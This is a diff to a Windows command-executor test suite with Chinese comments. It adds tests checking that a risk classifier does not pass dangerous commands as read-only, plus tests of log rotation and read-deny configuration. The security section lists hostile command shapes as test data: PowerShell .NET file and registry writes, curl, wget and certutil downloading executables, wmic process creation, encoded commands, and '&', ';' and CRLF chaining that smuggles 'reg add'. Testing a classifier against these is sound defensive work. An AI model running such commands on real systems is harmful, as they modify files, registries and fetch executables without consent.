@@ -28,15 +28,20 @@ import {
   TRANSPARENT_TIER,
   buildCapabilityCanaryScript,
   buildChildEnvironment,
+  classifyCommandRisk,
+  hasCurlWgetDownloadFlag,
+  isVersionOrHelpProbe,
   judgeCanary,
   parseMarkerJson,
   parsePeExports,
   probeShimDll,
+  rotateShimLog,
   runCapturedToFiles,
   selectLaunchMode,
+  SHIM_LOG_MAX_BYTES,
   writeShimConfig,
 } from '../src/executor.ts'
-import { compareKey } from '../src/paths.ts'
+import { compareKey, exportMaskJson } from '../src/paths.ts'
 
 const W = (s) => process.stdout.write(`${s}\n`)
 /**
@@ -1234,6 +1239,124 @@ async function main() {
     check('cmd 输出经文件采集成功', run.code === 0 && /CAPTURE-OK/.test(run.out), `exit=${run.code} out=${JSON.stringify(run.out.slice(0, 40))}`)
     const leftovers = existsSync(ROOT) ? readdirSync(ROOT).filter((name) => name.startsWith('.winstage-cap-')) : []
     check('采集用的临时文件被清理', leftovers.length === 0, JSON.stringify(leftovers))
+  }
+
+  // ══════════ 10. R17 安全审计：危险命令分类（read-only 不得一票放行） ══════════
+  //
+  // 为什么放在本套件（T3 审计、Lead 2026-10-17 同意扩权）：`classifyCommandRisk()` 在
+  // `src/executor.ts`；本套件本来就是"执行器编排"的离线集合，加一节纯函数断言
+  // 不需要新增套件接线。每条攻击形状都对应一次**真实副作用复现**（评审证据见
+  // `.lead/logs/security-auditor/probe-red.log` B2 段：真实文件被创建/删除、真实
+  // HKCU 临时键被创建，均已清理）。
+  section('10. R17 危险命令分类：read-only 快速放行路径不得被绕过')
+  {
+    // 10.1 只读动词 + 带副作用的 .NET/方法调用 ⇒ 不得读成 read-only
+    const sideEffectShapes = [
+      ['powershell', ['-Command', 'Get-Date | % { [IO.File]::WriteAllText("C:\\\\tmp\\\\x","x") }'], 'WriteAllText'],
+      ['powershell', ['-Command', 'Get-ChildItem C:\\\\tmp | % { [IO.File]::Delete($_.FullName) }'], '.NET File.Delete'],
+      ['powershell', ['-Command', 'Get-Date | % { [IO.Directory]::Delete("C:\\\\tmp\\\\d") }'], '.NET Directory.Delete'],
+      ['powershell', ['-Command', 'Get-Item C:\\\\tmp\\\\a | % { [IO.File]::Move("C:\\\\tmp\\\\a","C:\\\\tmp\\\\b") }'], '.NET File.Move'],
+      ['powershell', ['-Command', 'Get-Date | % { [Environment]::SetEnvironmentVariable("X","1") }'], 'SetEnvironmentVariable'],
+      ['powershell', ['-Command', 'Get-Date | % { [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey("Software\\\\X") }'], '.NET CreateSubKey'],
+      ['powershell', ['-Command', 'Get-Date | Add-Type -TypeDefinition "public class X {}"'], 'Add-Type'],
+      ['cmd', ['/c', 'echo ok & powershell -c "Get-Date | % { [IO.File]::Delete(\'C:\\\\tmp\\\\x\') }"'], 'echo & pwsh .NET Delete'],
+      // R18-KNOWN-09b：`[IO.File]::Replace` / `[System.IO.File]::Replace` 是真实文件替换
+      ['powershell', ['-Command', 'Get-Item C:\\\\tmp\\\\a | % { [IO.File]::Replace("C:\\\\tmp\\\\a","C:\\\\tmp\\\\b","C:\\\\tmp\\\\bak") }'], '[IO.File]::Replace'],
+      ['powershell', ['-Command', 'Get-Item C:\\\\tmp\\\\a | % { [System.IO.File]::Replace("C:\\\\tmp\\\\a","C:\\\\tmp\\\\b","C:\\\\tmp\\\\bak") }'], '[System.IO.File]::Replace'],
+    ]
+    for (const [command, args, label] of sideEffectShapes) {
+      const r = classifyCommandRisk(command, args)
+      check(`副作用 API 不得判 read-only：${label}`, r.risk !== 'read-only', `risk=${r.risk} reasons=${(r.reasons || []).join(' / ').slice(0, 120)}`)
+    }
+    // 10.2 下载器组合/粘连短旗标（`-sSo` / `-qO` / `-oout`）；R18-KNOWN-09b 补 `.exe` 形态
+    for (const [command, args, label] of [
+      ['curl', ['-sSo', 'out.exe', 'http://x/a'], 'curl -sSo'],
+      ['wget', ['-qO', 'out.txt', 'http://x/a'], 'wget -qO'],
+      ['curl', ['-oout.exe', 'http://x/a'], 'curl -oout.exe'],
+      ['cmd', ['/c', 'echo ok & curl -sSo out.exe http://x/a'], 'echo & curl -sSo'],
+      // R18-KNOWN-09b：`.exe` 作 head 与裸名同口径；组合落盘旗标仍判 write
+      ['curl.exe', ['-sSo', 'out.exe', 'http://x/a'], 'curl.exe -sSo'],
+      ['wget.exe', ['-qO', 'out.txt', 'http://x/a'], 'wget.exe -qO'],
+      ['curl.exe', ['--output', 'out.exe', 'http://x/a'], 'curl.exe --output'],
+    ]) {
+      const r = classifyCommandRisk(command, args)
+      check(`下载落盘组合旗标不得判 read-only：${label}`, r.risk !== 'read-only', `risk=${r.risk}`)
+    }
+    check('helper: hasCurlWgetDownloadFlag(-sSo)=true', hasCurlWgetDownloadFlag(['curl', '-sSo', 'out', 'http://x']) === true)
+    check('helper: hasCurlWgetDownloadFlag(-sS)=false', hasCurlWgetDownloadFlag(['curl', '-sS', 'http://x']) === false)
+    // 10.3 既有攻击面回归（绝对路径写程序 / 粘分隔符 / CRLF / cmd 嵌套 / certutil…）
+    for (const [command, args, label] of [
+      ['echo', ['ok & C:\\Windows\\System32\\reg.exe add HKCU\\X /v v /d 1'], '绝对路径 reg.exe'],
+      ['echo', ['x;reg add HKCU\\X /v v /d 1'], '分号粘 token'],
+      ['cmd', ['/c', 'echo a\r\nreg add HKCU\\X /v v /d 1'], 'CRLF 链'],
+      ['cmd', ['/c', 'cmd', '/c', 'reg', 'add', 'HKCU\\X', '/v', 'v', '/d', '1'], 'cmd /c 嵌套'],
+      ['certutil', ['-urlcache', '-f', 'http://x/a.exe', 'C:\\tmp\\a.exe'], 'certutil'],
+      ['wmic', ['process', 'call', 'create', 'calc'], 'wmic'],
+      ['powershell', ['-EncodedCommand', 'SQBFAFgA'], '-EncodedCommand'],
+    ]) {
+      const r = classifyCommandRisk(command, args)
+      check(`既有攻击面仍不得判 read-only：${label}`, r.risk !== 'read-only', `risk=${r.risk}`)
+    }
+    // 10.4 反向对照：真只读命令必须**仍然**判 read-only（否则 gate 退化成全面阻断）
+    for (const [command, args, label] of [
+      ['cmd', ['/c', 'echo', 'hello'], 'cmd /c echo hello'],
+      ['git', ['status'], 'git status'],
+      ['Get-ChildItem', ['C:\\Windows'], 'Get-ChildItem'],
+      ['node', ['--version'], 'node --version'],
+      ['node.exe', ['--version'], 'node.exe --version'],
+      ['curl.exe', ['http://x/a'], 'curl.exe（无落盘旗标）'],
+      ['wget.exe', ['http://x/a'], 'wget.exe（无落盘旗标）'],
+      ['powershell', ['-Command', '$s = Get-Date; $s.ToString().Replace("a","b")'.replace(';', '\n')], '纯内存字符串 Replace（不得被 [IO.File]::Replace 判据误伤）'],
+      ['powershell', ['-Command', '$x = Get-Date; $x.ToString()'.replace(';', '\n')], '纯内存 ToString'],
+    ]) {
+      const r = classifyCommandRisk(command, args)
+      check(`对照：${label} 仍判 read-only`, r.risk === 'read-only', `risk=${r.risk}`)
+    }
+    check('helper: isVersionOrHelpProbe(--version)=true', isVersionOrHelpProbe(['--version']) === true)
+    check('helper: isVersionOrHelpProbe(-Command x)=false', isVersionOrHelpProbe(['-Command', 'Get-Date']) === false)
+  }
+
+  // ══════════ 11. R18：shim.log 有界轮转 + 读遮蔽清单接线契约 ══════════
+  section('11. R18-KNOWN-08c/05b：shim.log 有界轮转 + readDenyFile 配置')
+  {
+    // 11.1 轮转：超过上限 ⇒ 改名 .old（保留 1 份），主文件回到"不存在/0"
+    const rotRoot = join(ROOT, 'rotate')
+    mkdirSync(rotRoot, { recursive: true })
+    const rotLog = join(rotRoot, 'shim.log')
+    writeFileSync(rotLog, Buffer.alloc(SHIM_LOG_MAX_BYTES + 1024, 0x41))
+    const first = rotateShimLog(rotLog)
+    check(
+      '超大 shim.log 被轮转（主文件消失、.old 保留 1 份）',
+      first.rotated === true && !existsSync(rotLog) && existsSync(`${rotLog}.old`),
+      JSON.stringify({ ...first, oldExists: existsSync(`${rotLog}.old`) }),
+    )
+    check('轮转读数 before > maxBytes 且 after=0', first.before > SHIM_LOG_MAX_BYTES && first.after === 0, JSON.stringify(first))
+    // 第二次：没有超大日志 ⇒ no-op（幂等，不来回改名）
+    const second = rotateShimLog(rotLog)
+    check('无超大日志时轮转是 no-op', second.rotated === false, JSON.stringify(second))
+    // 小日志不轮转
+    writeFileSync(rotLog, 'small\n')
+    check('小日志不轮转', rotateShimLog(rotLog).rotated === false, '小日志 no-op')
+
+    // 11.2 writeShimConfig：readDenyFile 进配置 + 进 passthrough + 启动前轮转
+    const cfgRoot = join(ROOT, 'shim-config')
+    mkdirSync(cfgRoot, { recursive: true })
+    const maskPath = join(cfgRoot, 'read-deny.mask.json')
+    writeFileSync(maskPath, `${exportMaskJson({ pretty: false })}\n`)
+    const bigLog = join(cfgRoot, 'shim.log')
+    writeFileSync(bigLog, Buffer.alloc(SHIM_LOG_MAX_BYTES + 1, 0x42))
+    const wrote = writeShimConfig({ stageRoot: cfgRoot, logPath: bigLog, readDenyFile: maskPath })
+    const cfg = JSON.parse(readFileSync(wrote.configPath, 'utf8'))
+    check('shim 配置含 readDenyFile（绝对路径）且 readDenyFailClosed=true', cfg.readDenyFile === maskPath && cfg.readDenyFailClosed === true, JSON.stringify({ readDenyFile: cfg.readDenyFile, readDenyFailClosed: cfg.readDenyFailClosed }))
+    check('readDenyFile 进入 passthrough（shim 不得暂存自己的策略文件）', Array.isArray(cfg.passthrough) && cfg.passthrough.includes(maskPath), JSON.stringify(cfg.passthrough))
+    check('写配置时顺带完成 shim.log 轮转', wrote.logRotation?.rotated === true, JSON.stringify(wrote.logRotation))
+
+    // 11.3 清单文件契约：schema/条数/probes 与 `MASK_CLASSES` 投影同源
+    const maskJson = JSON.parse(readFileSync(maskPath, 'utf8'))
+    check('mask 文件 schema=winstage.mask.v1', maskJson.schema === 'winstage.mask.v1', maskJson.schema)
+    check('mask 文件含 entries[] 与 probes[] 且非空', Array.isArray(maskJson.entries) && maskJson.entries.length > 0 && Array.isArray(maskJson.probes) && maskJson.probes.length > 0, `entries=${maskJson.entries?.length} probes=${maskJson.probes?.length}`)
+    check('mask entries 每条都有 id/pattern/flags/matchMode', maskJson.entries.every((e) => typeof e.id === 'string' && typeof e.pattern === 'string' && typeof e.flags === 'string' && e.matchMode === 'casefold'), '字段齐全')
+    check('mask probes 每条都有 path 且带 maskClass（可为 null）', maskJson.probes.every((p) => typeof p.path === 'string' && Object.prototype.hasOwnProperty.call(p, 'maskClass')), '字段齐全')
   }
 
   rmSync(ROOT, { recursive: true, force: true })
